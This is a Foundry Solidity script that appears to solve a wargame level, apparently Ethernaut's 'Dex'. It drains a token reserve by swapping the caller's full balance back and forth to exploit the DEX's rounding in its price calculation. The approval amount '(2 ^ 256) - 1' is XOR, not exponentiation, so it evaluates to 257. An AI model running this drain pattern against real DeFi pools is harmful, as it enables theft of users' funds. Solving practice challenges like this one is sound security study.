// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Dex.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract DexSolution is Script {
    Dex constant dexInstance = Dex(0x506369A02E45EBB2E75eECA83070060D21eE8A23);
    SwappableToken swappableTokenInstance1 =
        SwappableToken(dexInstance.token1());
    SwappableToken swappableTokenInstance2 =
        SwappableToken(dexInstance.token2());

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        dexInstance.approve(address(dexInstance), (2 ^ 256) - 1);
        dexInstance.swap(
            address(swappableTokenInstance1),
            address(swappableTokenInstance2),
            swappableTokenInstance1.balanceOf(vm.envAddress("MY_ADDRESS"))
        );
        dexInstance.swap(
            address(swappableTokenInstance2),
            address(swappableTokenInstance1),
            swappableTokenInstance2.balanceOf(vm.envAddress("MY_ADDRESS"))
        );
        dexInstance.swap(
            address(swappableTokenInstance1),
            address(swappableTokenInstance2),
            swappableTokenInstance1.balanceOf(vm.envAddress("MY_ADDRESS"))
        );
        dexInstance.swap(
            address(swappableTokenInstance2),
            address(swappableTokenInstance1),
            swappableTokenInstance2.balanceOf(vm.envAddress("MY_ADDRESS"))
        );
        dexInstance.swap(
            address(swappableTokenInstance1),
            address(swappableTokenInstance2),
            swappableTokenInstance1.balanceOf(vm.envAddress("MY_ADDRESS"))
        );
        dexInstance.swap(
            address(swappableTokenInstance2),
            address(swappableTokenInstance1),
            45
        );
        console.log(swappableTokenInstance1.balanceOf(address(dexInstance)));
        console.log(swappableTokenInstance2.balanceOf(address(dexInstance)));

        vm.stopBroadcast();
    }
}
